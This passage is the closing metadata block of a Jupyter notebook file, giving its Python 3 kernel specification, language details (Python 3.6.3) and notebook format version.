  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
